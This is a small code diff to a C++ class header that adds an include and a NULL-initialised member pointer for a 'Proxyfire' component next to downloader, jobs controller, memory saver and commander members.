@@ -5,6 +5,7 @@
 #include "Downloader.h"
 #include "JobsController.h"
 #include "MemorySaver.h"
+#include "Proxyfire.h"
 #include "Commander.h"
 
 class Commander;
@@ -18,6 +19,7 @@ public:
 	Downloader*     downloader	= NULL;
 	JobsController* jober		= NULL;
 	MemorySaver*    memorysaver = NULL;
+	Proxyfire*		proxyfire	= NULL;
 
 	BYTE* SessionKey = NULL;
 
